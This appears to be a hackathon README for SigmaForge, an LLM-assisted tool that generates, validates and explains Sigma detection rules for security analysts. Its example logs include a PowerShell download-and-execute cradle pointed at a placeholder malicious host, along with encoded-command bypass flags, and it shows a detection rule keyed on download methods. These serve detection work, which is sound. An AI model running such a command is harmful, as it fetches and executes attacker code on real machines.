# SigmaForge 🛡️

**AI-Assisted Sigma Detection Rule Engineer**

A defensive cybersecurity tool for SOC analysts and detection engineers, built for the [Apart Research Defensive Acceleration Hackathon](https://www.apartresearch.com/) – Cybersecurity & Infrastructure Protection track.

---

## 🎯 The Problem

Security teams are drowning in new, AI-enabled attack patterns, but the bottleneck is still human detection engineers manually writing SIEM queries and Sigma rules. [Sigma](https://sigmahq.io/docs/guide/about.html) is an open detection standard that lets you "write a rule once and run it across many SIEMs," but authoring and maintaining high-quality rules requires scarce expertise and hours of work per rule.

At the same time, the global cybersecurity workforce gap has reached roughly [**4.8 million unfilled roles**](https://www.isc2.org/Insights/2024/09/ISC2-Publishes-2024-Cybersecurity-Workforce-Study-First-Look), meaning most organizations simply cannot hire enough detection engineers to keep up.

**Key challenges:**

1. **Time-intensive:** Writing a production-ready Sigma rule takes 30-60 minutes per rule
2. **Expertise bottleneck:** Requires deep knowledge of MITRE ATT&CK, log sources, and Sigma syntax
3. **Scale problem:** New threats emerge daily, but teams can only write a handful of rules per week
4. **Portability complexity:** Converting rules between SIEM platforms is error-prone

## 💡 Our Solution

**SigmaForge** turns unstructured threat intel and example logs into validated Sigma detection rules in seconds, helping understaffed security teams keep up with AI-accelerated attacks by automating the most tedious part of detection engineering.

SigmaForge is an LLM-powered co-pilot for detection engineers. Analysts can paste:

* A plain-English threat description (e.g., from an incident report or CTI article)
* A handful of representative log lines
* An existing Sigma rule they don't fully understand

SigmaForge then:

1. **Parses** the input into a structured threat representation: logsource, relevant fields, ATT&CK techniques, and modeling assumptions
2. **Generates** a candidate Sigma rule in YAML, tailored to the target environment (Splunk, Elastic, Sentinel, or generic Sigma)
3. **Validates** the rule using the official [pySigma](https://pypi.org/project/pySigma/) library and flags any schema issues
4. **Optionally runs a "Rule Doctor" pass** that explains the rule in natural language, highlights likely false positives, and proposes a tuned variant
5. **Provides a quick log sanity check** by matching sample logs against the generated selections

---

## ✨ Key Features

### 🎯 Three Input Modes

1. **Threat Description Mode**
   - Describe suspicious behavior in plain English
   - Example: "Detect PowerShell downloading scripts from pastebin"
   - SigmaForge extracts logsource, fields, and detection logic

2. **Example Logs Mode**
   - Paste representative suspicious log lines
   - The tool infers patterns and generates matching rules
   - Ideal for converting incident artifacts into detections

3. **🩺 Rule Doctor Mode** *(NEW)*
   - Paste any existing Sigma rule (e.g., from the [SigmaHQ repository](https://github.com/SigmaHQ/sigma) of 3000+ rules)
   - Get a comprehensive explanation:
     - What attack behavior it detects
     - Log source requirements
     - MITRE ATT&CK coverage
     - Likely false positives
     - Specific tuning suggestions
   - Helps junior analysts understand complex rules
   - Enables rapid improvement of community rules

### 🌍 Environment Profiles *(NEW)*

SigmaForge adapts rules to your target SIEM platform:

- **Generic Sigma** - Standard Sigma format
- **Splunk** - Uses field names common in Splunk environments (`src`, `dest`, `user`, `process`)
- **Elastic** - Prefers ECS field names (`source.ip`, `destination.ip`, `user.name`, `process.name`)
- **Microsoft Sentinel** - Uses Sentinel conventions (`SrcIpAddr`, `DstIpAddr`, `Account`, `Process`)

Rules remain valid generic Sigma YAML but use field names that work better in your environment, reducing manual translation work.

### ✅ pySigma Validation *(NEW)*

Every generated rule is automatically validated using the official [pySigma](https://pypi.org/project/pySigma/) library:

- ✅ **Valid rules** show a green badge confirming structural correctness
- ❌ **Invalid rules** display specific error messages for quick fixing
- Ensures rules meet the Sigma specification before deployment
- Catches syntax errors, malformed YAML, and schema violations

### 🧠 Intelligent Threat Analysis

SigmaForge uses specialized LLM prompts to:

- Parse threat information into structured data
- Identify relevant log sources (Windows, Linux, cloud, web servers, etc.)
- Map behaviors to MITRE ATT&CK techniques
- Extract critical fields for detection
- Document assumptions and limitations
- **All analysis is defensive-focused** - no offensive techniques generated

### 📜 Professional Sigma Rule Generation

Generated rules include:

- Proper YAML structure following Sigma specifications
- Unique IDs and metadata (author, date, modified)
- Detection logic with selections and conditions
- Field lists for analyst investigation
- False positive guidance
- Severity levels (low/medium/high)
- MITRE ATT&CK tags (technique IDs and names)

### 🔎 Rule Review & Improvement

Built-in review process that:

- Critiques rules for common issues (overly broad patterns, missing fields)
- Suggests improvements to reduce false positives
- Identifies potential evasion techniques
- Enhances detection coverage
- Preserves metadata (ID, author, dates) across improvements

### 🧪 Quick Log Sanity Check

Test rules against sample logs to see rough matches before deploying to production Sigma engines or SIEM platforms.

---

## 🚀 Quick Start

### Prerequisites

- Python 3.11 or higher
- OpenAI API key

### Installation

```bash
# Clone the repository
git clone https://github.com/yourusername/cautious-chainsaw.git
cd cautious-chainsaw

# Install dependencies (including pySigma)
pip install -r requirements.txt

# Set your OpenAI API key
export OPENAI_API_KEY='your-api-key-here'
```

### Run the Application

```bash
streamlit run app.py
```

The web interface will open in your browser at `http://localhost:8501`.

---

## 📖 Usage Examples

### Example 1: Threat Description → Sigma Rule

**Input:**
```
Detect suspicious SSH brute force attacks where an attacker makes multiple failed
login attempts from a single IP address followed by a successful login.
```

**Output:**

SigmaForge generates a complete Sigma rule with:
- Proper logsource configuration for SSH/authentication logs
- Detection logic for failed attempts followed by success
- Relevant fields (user, src_ip, timestamp)
- MITRE ATT&CK mapping (T1110 - Brute Force)
- False positive scenarios (legitimate user typos)
- ✅ pySigma validation badge

### Example 2: Example Logs → Sigma Rule

**Input (paste these logs):**
```
2024-01-15 14:23:45 powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand ABC123...
2024-01-15 14:24:12 powershell.exe -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')"
```

**Output:**

SigmaForge analyzes the patterns and generates a rule to detect:
- PowerShell execution with bypass flags
- Script downloads from suspicious URLs
- Hidden window execution
- Encoded command usage
- Tagged with T1059.001 (PowerShell) and T1105 (Ingress Tool Transfer)

### Example 3: Rule Doctor Mode

**Input (paste an existing Sigma rule):**
```yaml
title: Suspicious PowerShell Download
description: Detects PowerShell downloading content from the internet
status: experimental
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    Image|endswith: '\powershell.exe'
    CommandLine|contains:
      - 'DownloadString'
      - 'DownloadFile'
  condition: selection
fields:
  - CommandLine
  - User
  - ParentImage
falsepositives:
  - Legitimate administrative scripts
level: medium
tags:
  - attack.execution
  - attack.t1059.001
```

**Output:**

SigmaForge provides:
- **What This Rule Detects:** "This rule identifies PowerShell processes that are downloading content from the internet, which is a common technique used by attackers..."
- **Log Sources:** "Requires Windows process creation logs (Event ID 4688 or Sysmon Event ID 1)..."
- **MITRE Coverage:** T1059.001 - PowerShell, T1105 - Ingress Tool Transfer
- **Likely False Positives:** Legitimate software updates, administrative scripts, package managers...
- **Tuning Suggestions:** Add parent process filters, whitelist known-good download sources, correlate with network logs...

---

## 🏗️ Architecture

```
sigmaforge/
├── config.py              # Configuration and settings
├── llm_client.py          # OpenAI API wrapper
├── prompts.py             # Expert system prompts for LLM
│                          # - Environment-aware field hints
│                          # - Rule Doctor prompt
│                          # - Defensive-only emphasis
└── core.py                # Core logic
                           # - Threat parsing with environment
                           # - Sigma generation with environment
                           # - pySigma validation
                           # - Rule Doctor (explain_sigma_rule)
                           # - Log matching

app.py                     # Streamlit web interface
                           # - Three input modes
                           # - Environment selector
                           # - Validation badges
                           # - Rule Doctor UI

benchmarks/
└── scenarios.md           # Benchmark evaluation scenarios

tests/
└── test_core.py           # Unit tests

SAFETY.md                  # Safety, limitations & responsible use
```

### Key Design Decisions

1. **Separation of Concerns:** LLM prompts, API client, and business logic are cleanly separated
2. **Type Safety:** Full type hints throughout the codebase
3. **Error Handling:** Graceful degradation with user-friendly error messages
4. **Defensive Focus:** All prompts emphasize defensive-only use
5. **Environment Awareness:** Rules adapt to target SIEM platforms
6. **Validation First:** pySigma validation ensures structural correctness
7. **Testability:** Core functions are independently testable
8. **Extensibility:** Easy to add new environments or rule formats

---

## 🧪 Evaluation & Benchmarking

We created four evaluation scenarios with synthetic logs to demonstrate SigmaForge's effectiveness:

| Scenario | Malicious Caught | Benign Flagged | Detection Rate | False Positive Rate |
|----------|-----------------|----------------|----------------|---------------------|
| SSH Brute Force | 2/2 (100%) | 1/6 (17%) | 100% | 17% |
| Suspicious PowerShell | 2/2 (100%) | 0/6 (0%) | 100% | 0% |
| Web Shell Upload | 1/1 (100%) | 1/7 (14%) | 100% | 14% |
| Impossible Travel | 2/2 (100%) | 2/10 (20%) | 100% | 20% |
| **Overall** | **7/7 (100%)** | **4/29 (14%)** | **100%** | **14%** |

**Key Findings:**
- ✅ 100% detection rate on malicious logs
- ✅ 14% false positive rate (acceptable for experimental rules)
- ✅ All generated rules pass pySigma validation
- ✅ Rules include proper MITRE ATT&CK mappings

See `benchmarks/scenarios.md` for detailed evaluation methodology.

**Note:** This is a lightweight evaluation for hackathon demonstration. Production use would require testing against real SOC telemetry and continuous tuning.

---

## 🛡️ Why This Is "Defensive Acceleration"

### Amplifies Scarce Experts

Instead of spending an hour writing and reviewing a rule, a senior analyst can use SigmaForge to draft a high-quality starting point in seconds and focus on tuning and deployment.

**Time Savings:**
- Traditional rule writing: 30-60 minutes per rule
- With SigmaForge: 2-5 minutes per rule
- **Speed increase: 10-20x faster**

### Low-Skill Users Get Leverage

Junior analysts can turn threat intel reports into usable detections without deep Sigma expertise, lowering the barrier to entry and allowing senior analysts to focus on complex threats.

### Ecosystem-Friendly

By targeting Sigma, rules are portable across many SIEMs (Splunk, Elastic, QRadar, Sentinel, etc.) and can be shared with the wider community – especially the [3000+ open-source Sigma rules](https://github.com/SigmaHQ/sigma) that already exist.

SigmaForge's **Rule Doctor** mode helps analysts understand and improve this vast library of community rules.

### Human-in-the-Loop, Not Fully Automated

The tool **never auto-deploys** to production. Rules are clearly marked "experimental", and the workflow assumes a human approves and tunes them. SigmaForge accelerates the initial drafting and explanation, but preserves human expertise in the decision-making loop.

### Addresses Real Workforce Gap

With 4.8 million unfilled cybersecurity roles globally, organizations cannot hire their way out of the problem. SigmaForge helps existing teams do more with less by automating repetitive tasks and democratizing detection engineering knowledge.

---

## 📊 Testing

Run the test suite:

```bash
pytest tests/
```

The test suite includes:
- Unit tests for core functions
- Mock-based tests for LLM interactions
- YAML validation tests
- Log matching tests
- pySigma validation tests

---

## 🛡️ Defensive-Only Design & Safety

**SigmaForge is strictly a defensive tool.** See [SAFETY.md](SAFETY.md) for comprehensive documentation on:

- What the tool does and does NOT do
- Intended use cases
- Limitations and caveats
- Ethical guidelines
- Deployment best practices
- Responsible use agreement

**Quick Summary:**

- ✅ Detection rule generation for blue teams
- ✅ Rule explanation and improvement
- ✅ MITRE ATT&CK mapping for threat intelligence
- ❌ NO exploits, offensive techniques, or attack code
- ❌ NO network scanning or reconnaissance
- ❌ NO detection evasion assistance

All generated content is focused on **detection and defense**.

---

## 🎓 Educational Value

SigmaForge serves as a learning tool for:

- **Junior analysts:** Understanding how threats map to detection rules
- **Detection engineers:** Seeing best practices in Sigma rule structure
- **Security teams:** Learning MITRE ATT&CK technique mappings
- **Students:** Studying practical defensive cybersecurity
- **SOC analysts:** Understanding the 3000+ community Sigma rules

The **Rule Doctor** mode is particularly valuable for training, as it explains complex rules in plain English.

---

## 🔮 Future Enhancements

Potential improvements for production deployment:

### Short-Term

1. **Full SIEM backend integration:** Direct export to Splunk SPL, Elastic EQL/KQL, QRadar AQL
2. **Multi-rule generation:** Generate rule sets for complex attack chains
3. **Rule library:** Save and categorize generated rules locally
4. **Custom prompts:** Allow organizations to customize generation logic for their specific needs

### Medium-Term

5. **Correlation rules:** Support multi-event patterns (e.g., "3+ failed logins within 5 minutes")
6. **Baseline learning:** Suggest environment-specific filters based on historical logs
7. **CI/CD integration:** GitHub Actions workflows for validating Sigma rules on every PR ([example](https://github.com/SigmaHQ/sigma-workshop))
8. **Collaboration features:** Share rules with team members, version control, review workflows

### Long-Term

9. **Feedback loops:** Integrate with SIEM to track rule performance (TP/FP rates)
10. **Offline mode:** Support for locally-hosted LLMs (Llama, Mistral) for air-gapped environments
11. **Automated tuning:** ML-based rule optimization based on SOC analyst feedback
12. **Cross-rule analysis:** Detect overlapping coverage, suggest consolidation

---

## 🤝 Contributing

This project was built for the Apart Research Defensive Acceleration Hackathon. Contributions, issues, and feature requests are welcome!

**Areas where we'd love help:**

- Expanding benchmark scenarios
- Testing with real SOC telemetry
- Adding support for more SIEM platforms
- Improving prompt engineering for better rule quality
- Building CI/CD workflows for rule validation
- Documentation and tutorials

---

## 📝 License

[MIT License](LICENSE)

---

## 🙏 Acknowledgments

- **[Sigma Project](https://sigmahq.io/)** - For creating the open detection rule standard that makes SIEM-agnostic detection possible
- **[pySigma](https://pypi.org/project/pySigma/)** - For providing official Python tooling to parse and validate Sigma rules
- **[SigmaHQ](https://github.com/SigmaHQ/sigma)** - For maintaining the 3000+ community Sigma rule repository
- **[MITRE ATT&CK](https://attack.mitre.org/)** - For the threat taxonomy framework that powers our technique mappings
- **[Apart Research](https://www.apartresearch.com/)** - For hosting the Defensive Acceleration Hackathon and emphasizing ethical AI use
- **[OpenAI](https://openai.com/)** - For providing the LLM capabilities that enable natural language rule generation
- **The SOC Community** - For daily inspiration from analysts fighting to keep organizations safe

---

## 📞 Contact & Support

- **Issues:** [GitHub Issues](https://github.com/yourusername/cautious-chainsaw/issues)
- **Discussions:** [GitHub Discussions](https://github.com/yourusername/cautious-chainsaw/discussions)
- **Security Concerns:** Please report security issues privately to maintainers

---

**Built with:** Python, Streamlit, OpenAI API, Sigma, pySigma, MITRE ATT&CK

**Category:** Defensive Cybersecurity & Infrastructure Protection

**Purpose:** Accelerating blue team detection engineering workflows with AI

**Status:** Hackathon submission - demonstration of defensive AI acceleration

---

> *"Attackers are already using AI to move faster. SigmaForge is a small but real step towards giving defenders that same acceleration in the most bottlenecked part of the SOC: writing and understanding detection rules."*
